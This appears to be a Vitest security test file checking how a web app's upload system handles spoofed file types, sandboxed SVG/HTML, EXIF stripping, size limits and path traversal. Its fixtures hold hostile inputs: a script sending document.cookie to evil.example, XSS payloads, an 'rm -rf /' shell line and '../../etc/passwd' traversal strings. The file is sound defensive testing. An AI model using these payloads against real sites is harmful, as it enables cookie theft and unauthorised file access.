import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { beforeAll, describe, expect, it } from "vitest";

/*
 * Security: uploads. A file is what its first bytes say, never what its name or the
 * browser claims; photos are redrawn by sharp with what's hidden in them (camera, GPS)
 * gone; HTML and SVG can only ever be a page's cover, served in a sandbox; no upload is
 * bigger than its limit or than the size asked for; and no path from outside can reach
 * a file it wasn't given.
 */

process.env.ALUMNITY_DB = "pglite";
process.env.ALUMNITY_AUTH = "fake";
process.env.ALUMNITY_STORAGE = "folder";
process.env.ALUMNITY_UPLOADS = mkdtempSync(join(tmpdir(), "alumnity-sec-uploads-"));

type U = import("../lib/server/auth").User;
let db: typeof import("../lib/server/db");
let people: typeof import("../lib/server/people");
let media: typeof import("../lib/server/media");
let storage: typeof import("../lib/server/storage");
let mediaRoute: typeof import("../app/media/[id]/route").GET;
let uploadRoute: typeof import("../app/api/media/route").POST;
let putRoute: typeof import("../app/api/media/put/route").PUT;
let sharp: typeof import("sharp").default;

const bytes = (...parts: (number[] | string)[]) => new Uint8Array(parts.flatMap((p) => (typeof p === "string" ? [...new TextEncoder().encode(p)] : p)));
const SVG = bytes('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"><script>alert(1)</script></svg>');
const HTML = bytes("<!doctype html><script>fetch('https://evil.example/?c='+document.cookie)</script>");

let n = 0;
async function member(name: string): Promise<U> {
  n += 1;
  const row = await db.db().one<{ id: number }>(
    "insert into users (email, name, role, auth_id, created_at) values (?, ?, 'alumnus', ?::uuid, ?) returning id",
    `up${n}@example.com`,
    name,
    crypto.randomUUID(),
    Date.now() + n
  );
  return (await people.memberById(row!.id))!;
}

/** Runs `work` signed in as `u` (the stand-in Supabase's browser for them). */
async function as<T>(u: U | null, work: () => Promise<T>): Promise<T> {
  const auth = await (await import("../lib/server/auth-provider")).fakeAuth();
  if (!u) {
    auth.use("nobody");
  } else {
    const authId = (await db.db().one<{ auth_id: string }>("select auth_id from users where id = ?", u.id))!.auth_id;
    auth.accounts.set(u.email, { authId, password: "a long test password", code: null });
    auth.use(`browser-${u.id}`);
    await auth.signInWithPassword(u.email, "a long test password");
  }
  try {
    return await work();
  } finally {
    auth.use("main");
  }
}

const SAME_SITE = { origin: "http://localhost", "x-forwarded-host": "localhost" };
const post = (url: string, body: unknown, headers: Record<string, string> = SAME_SITE) =>
  new Request(url, { method: "POST", headers: { "content-type": "application/json", ...headers }, body: JSON.stringify(body) });

beforeAll(async () => {
  db = await import("../lib/server/db");
  people = await import("../lib/server/people");
  media = await import("../lib/server/media");
  storage = await import("../lib/server/storage");
  ({ GET: mediaRoute } = await import("../app/media/[id]/route"));
  ({ POST: uploadRoute } = await import("../app/api/media/route"));
  ({ PUT: putRoute } = await import("../app/api/media/put/route"));
  sharp = (await import("sharp")).default;
});

describe("what a file is", () => {
  it("SVG and HTML are only ever a cover, never a photo, a post or a story", async () => {
    const u = await member("Sven Svg");
    expect(media.sniff(SVG)?.kind).toBe("html");
    for (const file of [SVG, HTML]) {
      for (const use of ["photo", "post", "story"] as const) expect((await media.saveUpload(u.id, use, file)).ok).toBe(false);
    }
    // A file named .jpg with a page inside is still a page.
    expect(media.sniff(bytes("  \n<html><body>hi</body></html>"))?.kind).toBe("html");
    // Programs, PDFs, archives and plain text are nothing we take.
    for (const other of [bytes("MZ\u0090"), bytes("%PDF-1.4"), bytes([0x50, 0x4b, 0x03, 0x04]), bytes("just words"), bytes("#!/bin/sh\nrm -rf /")]) {
      expect(media.sniff(other)).toBeNull();
      expect((await media.saveUpload(u.id, "cover", other)).ok).toBe(false);
    }
  });

  it("a cover that's HTML or SVG is served sandboxed: no scripts against the site, no network, never sniffed", async () => {
    const owner = await member("Cora Cover");
    const viewer = await member("Vera Viewer");
    const saved = await media.saveUpload(owner.id, "cover", SVG);
    if (!saved.ok) throw new Error(saved.error);
    const response = await as(viewer, () => mediaRoute(new Request(`http://localhost/media/${saved.media.id}`), { params: Promise.resolve({ id: saved.media.id }) }));
    expect(response.status).toBe(200);
    const csp = response.headers.get("content-security-policy") ?? "";
    expect(csp).toMatch(/sandbox allow-scripts(;|$)/); // no allow-same-origin: an opaque origin, no cookies
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("frame-ancestors http://localhost");
    expect(response.headers.get("x-content-type-options")).toBe("nosniff");
  });

  it("a GIF with script inside it is still only a picture: served as one, never sniffed", async () => {
    const owner = await member("Gif Owner");
    const viewer = await member("Gif Viewer");
    const saved = await media.saveUpload(owner.id, "post", bytes("GIF89a", "<script>alert(1)</script>"));
    if (!saved.ok) throw new Error(saved.error);
    expect(saved.media.mime).toBe("image/gif");
    const response = await as(viewer, () => mediaRoute(new Request(`http://localhost/media/${saved.media.id}`), { params: Promise.resolve({ id: saved.media.id }) }));
    // On no post yet, so it's served as the owner's: an image, with a policy that runs nothing.
    expect(response.headers.get("content-type")).toBe("image/gif");
    expect(response.headers.get("content-security-policy")).toBe("default-src 'none'; sandbox");
    expect(response.headers.get("x-content-type-options")).toBe("nosniff");
  });

  it("photos lose what's hidden in them (EXIF, GPS), whatever the format", async () => {
    const u = await member("Exif Person");
    const exif = { IFD0: { Copyright: "secret place", Artist: "Hidden Name" }, IFD3: { GPSLatitudeRef: "N", GPSLongitudeRef: "E" } };
    for (const format of ["jpeg", "png", "webp"] as const) {
      const photo = await sharp({ create: { width: 64, height: 48, channels: 3, background: "#468" } }).withMetadata({ exif })[format]().toBuffer();
      expect((await sharp(photo).metadata()).exif).toBeDefined();
      const saved = await media.saveUpload(u.id, "photo", new Uint8Array(photo));
      if (!saved.ok) throw new Error(saved.error);
      const kept = Buffer.from((await media.readMedia(saved.media))!);
      expect((await sharp(kept).metadata()).exif, format).toBeUndefined();
      expect(kept.includes(Buffer.from("secret place")), format).toBe(false);
    }
  });
});

describe("how big", () => {
  it("a size that isn't a size, or is over the limit, is refused at the start", async () => {
    const u = await member("Size Person");
    for (const size of [0, -1, Number.NaN, Number.POSITIVE_INFINITY, 1.5, 1e20]) expect((await media.startUpload(u.id, "post", size)).ok, String(size)).toBe(false);
    expect((await media.startUpload(u.id, "photo", media.LIMITS.image + 1)).ok).toBe(false);
    expect((await media.startUpload(u.id, "post", media.LIMITS.video + 1)).ok).toBe(false);
  });

  it("a file bigger than the size asked for is refused, so the day's limit can't be slipped past", async () => {
    const u = await member("Sly Uploader");
    const real = new Uint8Array(await sharp({ create: { width: 300, height: 300, channels: 3, background: "#963" } }).jpeg().toBuffer());
    const started = await media.startUpload(u.id, "post", 10); // asks for 10 bytes…
    if (!started.ok) throw new Error(started.error);
    await storage.storage().write(media.pendingUploadPath(u.id, started.id), real, "image/jpeg"); // …sends more
    expect((await media.finishUpload(u.id, started.id)).ok).toBe(false);
    expect(await media.mediaById(started.id)).toBeNull();
    // The honest size works.
    const honest = await media.startUpload(u.id, "post", real.length);
    if (!honest.ok) throw new Error(honest.error);
    await storage.storage().write(media.pendingUploadPath(u.id, honest.id), real, "image/jpeg");
    expect((await media.finishUpload(u.id, honest.id)).ok).toBe(true);
  });

  it("a day's uploads stop at the daily limit", async () => {
    const u = await member("Busy Uploader");
    await db.db().run("insert into uploads (id, user_id, use, size, created_at) values ('bigpending1', ?, 'post', ?, ?)", u.id, media.DAILY_BYTES - 100, Date.now());
    expect(await media.startUpload(u.id, "post", 1000)).toMatchObject({ ok: false, status: 429 });
  });
});

describe("paths", () => {
  it("no path from outside reaches a file it wasn't given", async () => {
    const u = await member("Path Person");
    for (const bad of ["../../etc/passwd", "..\\..\\windows\\win.ini", "/etc/passwd", "a/../../b", "%2e%2e%2fetc", "a\u0000b", "x".repeat(65)]) {
      expect(await media.mediaById(bad)).toBeNull();
      expect(await media.pendingUpload(u.id, bad)).toBeNull();
      expect((await media.finishUpload(u.id, bad)).ok).toBe(false);
    }
    for (const bad of ["../outside", "../../etc/passwd", "/etc/passwd", "a/../../b"]) {
      await expect(storage.storage().read(bad)).resolves.toBeNull(); // refused (read swallows the error)
      await expect(storage.storage().write(bad, bytes("x"), "text/plain")).rejects.toThrow(/Bad storage path/);
    }
    const viewer = await member("Path Viewer");
    for (const id of ["..%2F..%2Fetc%2Fpasswd", "../../etc/passwd", "%00", "a.b"]) {
      const response = await as(viewer, () => mediaRoute(new Request(`http://localhost/media/x`), { params: Promise.resolve({ id }) }));
      expect(response.status).toBe(404);
    }
  });

  it("the local upload endpoint writes only to the one place it gave out, for its own member", async () => {
    const u = await member("Put Person");
    const other = await member("Other Putter");
    const started = await media.startUpload(u.id, "post", 4);
    if (!started.ok) throw new Error(started.error);
    const put = (path: string, headers: Record<string, string> = SAME_SITE) =>
      putRoute(new Request(`http://localhost/api/media/put?path=${encodeURIComponent(path)}`, { method: "PUT", headers, body: bytes([0xff, 0xd8, 0xff, 0xe0]) }));
    const mine = media.pendingUploadPath(u.id, started.id);
    expect((await as(u, () => put(`pending/${u.id}/../../${started.id}`))).status).toBe(404);
    expect((await as(u, () => put(`../${mine}`))).status).toBe(404);
    expect((await as(other, () => put(mine))).status).toBe(404); // someone else's upload
    expect((await as(null, () => put(mine))).status).toBe(401);
    expect((await as(u, () => put(mine, { origin: "https://evil.example", "x-forwarded-host": "localhost" }))).status).toBe(403);
    expect((await as(u, () => put(mine))).status).toBe(200);
  });

  it("the upload endpoint answers only this site, and only someone signed in", async () => {
    const u = await member("Endpoint Person");
    expect((await as(u, () => uploadRoute(post("http://localhost/api/media", { step: "start", use: "post", size: 10 }, { origin: "https://evil.example", "x-forwarded-host": "localhost" })))).status).toBe(403);
    expect((await as(u, () => uploadRoute(post("http://localhost/api/media", { step: "start", use: "post", size: 10 }, { origin: "null", "x-forwarded-host": "localhost" })))).status).toBe(403);
    expect((await as(u, () => uploadRoute(post("http://localhost/api/media", { step: "start", use: "post", size: 10 }, { "x-forwarded-host": "localhost" })))).status).toBe(403);
    expect((await as(null, () => uploadRoute(post("http://localhost/api/media", { step: "start", use: "post", size: 10 })))).status).toBe(401);
    expect((await as(u, () => uploadRoute(post("http://localhost/api/media", { step: "start", use: "post", size: 10 })))).status).toBe(200);
  });
});
